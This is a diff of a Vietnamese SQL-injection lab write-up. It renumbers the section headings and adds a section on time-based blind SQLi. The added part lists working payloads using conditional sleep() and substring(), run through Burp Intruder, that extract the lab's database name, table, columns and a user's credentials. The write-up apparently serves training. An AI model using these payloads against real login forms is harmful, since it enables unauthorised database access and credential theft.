@@ -108,7 +108,7 @@ Em đã có được thông tin người dùng đầu tiên như sau:
 
 Muốn lấy thông tin những người dùng còn lại, ta làm tương tự như trên và thay bằng `limit 1,1`, `limit 2,1`,...
 
-## 2.2. Khai thác Union-based
+## 2. Khai thác Union-based
 
 Tương tự như Error-based, em biết ô username dính SQLi.
 Với Union-based, đầu tiên, em tìm số cột trong bảng bằng cách truyền payload `' OR 1=1 ORDER BY 1 -- ` vào ô `username`.
@@ -147,7 +147,7 @@ Bây giờ, để truy xuất dữ liệu người dùng, em sử dụng payload
 
 ![](https://i.imgur.com/e1GacrZ.png)
 
-## 2.3. Khai thác Boolean based SQLi
+## 3. Khai thác Boolean based SQLi
 
 Đầu tiên, em nhập `username` và `password` bất kỳ thì được kết quả như sau: 
 
@@ -323,6 +323,181 @@ Tương tự như lấy `username`, em tìm password với các payload sau:
 Kết quả:
 
 ![](https://i.imgur.com/vIzpByh.png)
+
+Password đầu tiên là `cuc`.
+Vậy user `duongcuc` có password là `cuc`.
+
+## 4. Khai thác Time based SQLi
+Lab này vẫn dính SQLi ở ô `username` nhưng khác lab trước là dù em nhập input đúng hay sai thì chỉ ra một kết quả như sau:
+
+![](https://i.imgur.com/8ArUF9r.png)
+
+Vì vậy, ta không thể khai thác Boolean như lab trước.
+
+Em thử với payload `' or (case when 1=2 then 1 else sleep(1) end)=1 -- ` thì thấy response received lên đến hơn 3000 milis, vì vậy với lab này, ta có thể khai thác Time based SQLi.
+
+![](https://i.imgur.com/lW7g816.png)
+
+
+### Tìm tên database
+* Tìm độ dài tên database
+
+    **Payload:** `' or (case when length(database())=1 then sleep(1) else 1 end)=1 -- ` 
+
+    Send to Intruder:
+    
+    ![](https://i.imgur.com/28yoEu6.png)
+    ___
+    ![](https://i.imgur.com/C9m7P2A.png)
+    ___
+    ![](https://i.imgur.com/bdwtpQI.png)
+    ___
+    Kết quả:
+
+    ![](https://i.imgur.com/bf8UGR4.png)
+
+    Dựa vào response received => Tên database chứa 4 ký tự.
+    
+* Tìm tên database
+
+    **Payload: **`' or (case when substring((database),1,1)='a' then sleep(1) else 1 end)=1 -- `
+
+    Send to Intruder:
+
+    ![](https://i.imgur.com/BnSL4Gg.png)
+    ___
+    ![](https://i.imgur.com/wwZYLYu.png)
+    ___
+    ![](https://i.imgur.com/Vw9ZRBr.png)
+    ___
+    Kết quả:
+
+    ![](https://i.imgur.com/HdIkvBs.png)
+
+    Vậy tên database là `kcsc`.
+
+### Tìm tên bảng
+* Tìm độ dài tên bảng
+
+    **Payload:** `' or (case when (select length(table_name) from information_schema.tables where table_schema='kcsc' limit 1,1)=1 then sleep(1) else 1 end)=1 -- ` 
+
+    Send to Intruder:
+    
+    ![](https://i.imgur.com/ZAaDRPt.png)
+    ___
+    ![](https://i.imgur.com/tiE0yq4.png)
+    ___
+    ![](https://i.imgur.com/7SbSofv.png)
+    ___
+    Kết quả:
+
+    ![](https://i.imgur.com/LnaoaKo.png)
+
+    Dựa vào response received => Tên bảng chứa 5 ký tự
+    
+* Tìm tên bảng
+
+    **Payload:** `' or (case when substring((select table_name from information_schema.tables where table_schema='kcsc' limit 1,1),1,1)='a' then sleep(1) else 1 end)=1 -- ` 
+
+    Send to Intruder:
+
+    ![](https://i.imgur.com/NUFEzVE.png)
+    ___
+    ![](https://i.imgur.com/eE44AzL.png)
+    ___
+    ![](https://i.imgur.com/0rzV2OJ.png)
+    ___
+    Kết quả:
+
+    ![](https://i.imgur.com/Q7L6Ucb.png)
+
+    Vậy tên bảng là `task7`.
+
+### Tìm tên cột
+* Tìm độ dài tên cột
+
+    **Payload:** `' or (case when (select length(column_name) from information_schema.columns where table_name='task7' limit 0,1)=1 then sleep(1) else 1 end)=1 -- ` 
+
+    Send to Intruder:
+    
+    ![](https://i.imgur.com/hB6mqrb.png)
+    ___
+    ![](https://i.imgur.com/7tX5iR3.png)
+    ___
+    ![](https://i.imgur.com/CRJvFL5.png)
+    ___
+    Kết quả:
+
+    ![](https://i.imgur.com/46mRRyq.png)
+
+    Dựa vào response received => Bảng `task7` gồm 3 cột: tên cột thứ nhất chứa 2 ký tự, cột thứ hai và thứ ba đều chứa 8 ký tự.
+    
+* Tìm tên cột
+
+    **Payload:** `' or (case when substring((select column_name from information_schema.columns where table_name='task7' limit 0,1),1,1)='a' then sleep(1) else 1 end)=1 -- ` 
+
+    Send to Intruder:
+
+    ![](https://i.imgur.com/eIHGzqp.png)
+    ___
+    ![](https://i.imgur.com/z5JKiSg.png)
+    ___
+    ![](https://i.imgur.com/lNF2sgv.png)
+    ___
+    ![](https://i.imgur.com/lrFIbuj.png)
+    ___
+    Kết quả:
+
+    ![](https://i.imgur.com/YjTPEZI.png)
+
+    Bảng `task7` có 3 cột lần lượt là `id`, `username` và `password`.
+    
+### Lấy dữ liệu
+#### Lấy username
+* Tìm độ dài username
+
+    **Payload:** `' or (case when (select length(username) from `task7` limit 0,1)=1 then sleep(1) else 1 end)=1 -- ` 
+    
+    Send to Intruder:
+    
+    ![](https://i.imgur.com/lXUMQEv.png)
+    ___
+    ![](https://i.imgur.com/M1fcwHI.png)
+    ___
+    Kết quả:
+
+    ![](https://i.imgur.com/SOKvDui.png)
+
+    Username đầu tiên chứa 8 ký tự.
+    
+* Tìm username
+
+    **Payload:** `' or (case when substring((select username from `task7` limit 0,1),1,1)='a' then sleep(1) else 1 end)=1 -- ` 
+
+    Send to Intruder:
+
+    ![](https://i.imgur.com/nuGRpHV.png)
+    ___
+    ![](https://i.imgur.com/kKa92i5.png)
+    ___
+    ![](https://i.imgur.com/30tja8E.png)
+    ___
+    Kết quả:
+
+    ![](https://i.imgur.com/fI6USm4.png)
+
+    Username đầu tiên là `duongcuc`.
+    
+#### Lấy password
+Tương tự như lấy `username`, em tìm password với các payload sau:
+
+* **Payload tìm độ dài password:** `' or (case when (select length(password) from `task7` limit 0,1)=1 then sleep(1) else 1 end)=1 -- `
+
+* **Payload tìm password:** `' or (case when substring((select password from `task7` limit 0,1),1,1)='a' then sleep(1) else 1 end)=1 -- `
+
+Kết quả:
+
+![](https://i.imgur.com/FMU4OBk.png)
 
 Password đầu tiên là `cuc`.
 Vậy user `duongcuc` có password là `cuc`.
